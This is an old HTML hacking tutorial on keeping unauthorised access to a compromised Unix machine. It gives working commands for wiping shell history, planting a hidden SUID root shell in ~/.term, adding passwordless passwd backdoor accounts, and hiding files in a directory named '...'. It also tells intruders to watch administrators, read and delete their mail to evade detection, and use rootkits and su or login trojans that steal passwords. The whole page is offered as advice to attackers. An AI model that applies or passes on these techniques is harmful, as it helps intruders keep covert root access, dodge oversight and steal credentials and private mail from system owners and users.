<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Keeping access on the
machine</TITLE>
</HEAD>
<BODY TEXT="#d0d0d0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">
<B><FONT SIZE=+1>Keeping access on the machine</FONT></B><P>Topics:<BR><A HREF="#tricks">Tricks of the trade</A><BR><A HREF="#kits">Root and Demon kits and trojans</A><BR>&nbsp;<P>There are many ways to keep access to the machine, you will loose<BR>access
 to many as you as you are learning, but I hope with this manual<BR>and some experience you will become a stable hacker.<P><A NAME="tricks"></A><B><FONT SIZE=+1>Tricks of the Trade</FONT></B><P>Here are some 'tricks' of the trade that will help you keep a
ccess<BR>to the machine.&nbsp; After a system admin has found you out, theywill be watching<BR>for you and going through everything on the system.&nbsp; They willgo as far as<BR>recompiling binary files, changing everyone's passwords, denying yourhost you
<BR>came in from to the machine, going through the passwd or shadow file,looking<BR>for SUID files, etc....<P>When you see that you have been found out, do not try to get accessto the<BR>system again.&nbsp; I have seen others right after being cought, try
everyone of<BR>their trojans, other accounts, and other backdoor's they placed forcontinued<BR>access.&nbsp; Well think about it, they are watching for you ... youare showing<BR>them every in that you have to the system, and every exploitable fileyou<BR>a
re making known to them.<P>NO!&nbsp; WAIT!&nbsp; Give it a few months, they will think everythingis ok, and they<BR>will relax and you can come in with one of the backdoor's they missed,and you<BR>can do your thing on the logs for all of the attempts you 
made on thesystem<BR>to get back in.<P>Ok here are some tricks of the trade.<P>History Files:<BR>--------------<BR>Always put your .bash_history to /dev/null, if you don't make sureyou at least<BR>edit it.&nbsp; Remember the .bash_history will always have
 your lastcommands until<BR>the logoff.&nbsp; So if you edit it, it will show that you are editingit. You might<BR>try changing your shell and editing it there, but this all seems likea pain,<BR>just set it to /dev/null<P>1. Delete the file in the user di
rectory .bash_history if it there.<BR>2. Type this command in the home directory: ln -s /dev/null .bash_history<P>Nested directory:<BR>-----------------<BR>Always find a directory on the system to hide your files.&nbsp; Thereare a few good<BR>ones that mo
st users never look into.<P>In the users home directory look for .term, all you will find in thisdirectory<BR>is an executable file called termrc.&nbsp; Admin's and users alikeare used to seeing this<BR>hidden directory, and never EVER go into it.&nbsp; i
f they did whatdo you think<BR>they would say to an executable file being in there called termrc?&nbsp;You are right!<BR>Nothing .... it belongs there and it is what they expect to see there.<P>So lets say we make termrc a little bigger, and add suid perm
's ...are you<BR>getting the idea???? I hope you guessed it... go to the /bin directoryand<BR>type cp bash (or sh whatever is there) ~username/.term/termrc<BR>then type : chown root ~username/.term/termrc<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp; : chgrp root~username/.term/termrc<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : chmod +s ~username/.term/termrc<P>Now you have a nested file that can get you root on the system any timethat<BR>will not be easy for the admin to find.
&nbsp; If you want to get fancy,touch<BR>the file date to make it look like an older file.<P>Another directory off the user accounts expected to be there and unusedwould<BR>be .elm, .term or Mail, or try making a directory called '...' thisis harder<BR>to
 notice seeing the first directories that show are . and .., so itcan go<BR>un-noticed easy.&nbsp; This is how it would look if they did a longls:<P>1024 Jan 29 21:03 .<BR>1024 Dec 28 00:12 ..<BR>1024 Jan 29 21:03 ...<BR>&nbsp;509 Mar 02&nbsp; 1996 .bash_
history<BR>&nbsp; 22 Feb 20&nbsp; 1996 .forward<BR>&nbsp;164 May 18&nbsp; 1996 .kermrc<BR>&nbsp; 34 Jun 06&nbsp; 1993 .less<BR>&nbsp;114 Nov 23&nbsp; 1993 .lessrc<BR>1024 May 18&nbsp; 1996 .term<BR>1024 May 19&nbsp; 1996 public_html<P>see how it seems to 
just fit into place?<P>but if it was just a ls -l, this is what would be seen:<P>1024 May 19&nbsp; 1996 public_html<P>Remember you can always look for some REAL LONG file path that you aresure<BR>that no one would ever even want to enter into, and use thi
s for yournested<BR>directory.&nbsp; You can even make your own directory there like:(...);)<BR>&nbsp;<P>Making new commands<BR>--------------------<BR>After you check the cron to see if there is md5 being used there, youmight<BR>want to either copy one o
f your exploits to another filename in thesystem,<BR>or maybe just overwrite a command that you know would never be used.&nbsp;If<BR>you copy to a new file name make sure you touch the file date.&nbsp;This is not<BR>so long lasting because sooner or later
 they will patch the exploitand your<BR>new file you made will not work anymore.<P>It is better to use a shell for the new filename, and then make it suid.<P>Adding or changing passwd entry's<BR>---------------------------------<BR>Another backdoor that y
ou can use is to add a new user to the passwdfile.<BR>This needs to be done with caution making it look like it belongs there.<BR>Never use your passwd addition, never login, it is just for a backupin case<BR>you loose access.<P>There are different though
ts here: you do not have to make it a rootaccount<BR>that could cause notice to it right away.&nbsp; You know you can haveroot any time<BR>you want it.&nbsp; Lets practice ...<P>We want to make our account look like it belongs, so lets keep to thetop of<B
R>the file.<P>root:fVi3YqWnkd4rY:0:0:root:/root:/bin/bash<BR>sysop:mZjb4XjnJT1Ys:582:200:System Operator:/home/sysop:/bin/bash<BR>bin:*:1:1:bin:/bin:<BR>daemon:*:2:2:daemon:/sbin:<BR>adm:*:3:4:adm:/var/adm:<BR>lp:*:4:7:lp:/var/spool/lpd:<BR>sync:*:5:0:syn
c:/sbin:/bin/sync<BR>shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown<BR>halt:*:7:0:halt:/sbin:/sbin/halt<BR>mail:*:8:12:mail:/var/spool/mail:<BR>news:*:9:13:news:/usr/lib/news:<BR>uucp:*:10:14:uucp:/var/spool/uucppublic:<BR>operator:*:11:0:operator:/root:/bi
n/bash<BR>games:*:12:100:games:/usr/games:<BR>man:*:13:15:man:/usr/man:<BR>postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash<BR>nobody:*:65535:100:nobody:/dev/null:<BR>ftp:*:404:1::/home/ftp:/bin/bash<P>Looking at the above passwd file leaves us a f
ew options so i will justlist<BR>them here.<P>1. Look at the user line for operator, ftp, and postmaster.&nbsp; Allof these<BR>accounts have shells with no passwd's set yet.&nbsp; From your shelljust type:<P>passwd postmaster<P>Set the account with no pas
swd by just pressing enter.&nbsp; Now youwill be able<BR>to log into this account any time without a password and the file willstill<BR>look right to the admin.<P>2. add this line to the passwd file:<P>syst::13:12:system:/var/spool:/bin/bash<P>Place it in
 the file where it seems to flow.&nbsp; You can leave the:: for the<BR>passwd or set the passwd to what you want by typing: passwd syst fromthe<BR>root shell.&nbsp; Set the group and id above to what you like.<BR>&nbsp;<P>3. Look at the line above for syn
c<P>sync:*:5:0:sync:/sbin:/bin/sync<P>Change this to :<P>sync:*:5:0:sync:/sbin:/bin/bash and then run &lt;passwd sync> and leavethe passwd<BR>blank.&nbsp; (or set a passwd don't matter) On this account we areeven gid=0 &lt;G>rin<P>Installing games<BR>----
------------<P>You could always install exploitable doom or abuse into the system ifthey<BR>already have games installed.&nbsp; I will include the root exploitsfor these<BR>games below in the appendix.<P>Always be watching<BR>------------------<P>Always k
now who the admin's are on a system, you can find them by lookingat<BR>the passwd file to see home directories, placement of the uid, groupaccess<BR>accounts, and ALWAYS read all of the bash_history files in the userdirectories<BR>to see who is using admi
n commands.&nbsp; You will also learn allotof new commands<BR>from reading history files, but you want to know who is who on thesystem.<BR>Get to know your system well. Look for users using su:&nbsp; View thelog files<BR>to see who is using admin commands
.<P>Always be watching the system, keep track of who is on while you are.&nbsp;Watch<BR>the admin's history to see what commands they are using, ttysnoops?too many<BR>ps commands?&nbsp; finger commands after ps or w or who commands willshow they<BR>are wa
tching what other users on the system are doing.&nbsp; Watchyour admin's<BR>and get to know how aware they are of users on their system.<P>Reading system mail<P>Rember first NEVER to use system mail programs!&nbsp; They will be ableto tell you<BR>are read
ing their mail.&nbsp; I use a combo of a few things.&nbsp;Here you go...<P>1. cd /var/spool/mail<P>This will put you into the directory that holds all of the unread mail,or<BR>waiting mail.&nbsp; Now you can do things like:<P>grep -i security * |more<BR>g
rep -i hack * |more<BR>grep -i intruder * |more<BR>grep -i passwd * |more<BR>grep -i password * |more<P>Then if needed pico username, and ctrl w to search for your maeesge.&nbsp;You<BR>can also delete messages if you see some other admin is telling themth
at<BR>your user name is hacking their machine from their domain.<P>For a mail reader that will allow toy to read mail without updatingpointers<BR>try:<P>http://obsidian.cse.fau.edu/~fc<BR>has a util on it that can cat /var/spool/mail files without changin
gthe<BR>last read dates.. ie they have no idea that you have read their mail.<P>Also remember you can find other system mail in user's directories.&nbsp;Make sure<BR>to look in the /root directory.&nbsp; Look for /root/mail or username/mailor other<BR>dir
ectories or filders that contain older mail.<P>Happy Hunting ...<BR>&nbsp;<P><A NAME="kits"></A><B><FONT SIZE=+1>Root and Demon Kits and Trojans</FONT></B><P>Root kits are C source for ps, login, netstat and sometimes some other<BR>programs that have been
 hacked for you.&nbsp; With these kits you willbe<BR>able to replace the login files on the hacked box so that you can login<BR>without an account on the machine.<P>You will also be able to patch ps so that you will not show up whenan<BR>admin uses the ps
 command.&nbsp; With the ps patch you can also haveit not show<BR>processes that have certain file names such as any file that startswith<BR>'sniff'.<P>Demon kits will have hacked programs for identd, login demon, ping,su,<BR>telnetd, and, socket.<P>Troja
ns will be any file that you can use that will allow you to exploit<BR>the system in some way.&nbsp; An su trojan placed in the admin's directorywould<BR>run the trojan su first after you change the export path for him ;)and report<BR>back that he typed t
he wrong passwd and delete the trojan file, butsaving<BR>the password he typed to the /tmp directory.<P>A login trojan would save all login passwords to a file on the machine<BR>for you.&nbsp; I think you get the idea ;)<P>Demon and Linux root kits have b
een uuencoded and attached to the endof<BR>appendix VI<BR>&nbsp;</BODY></HTML>
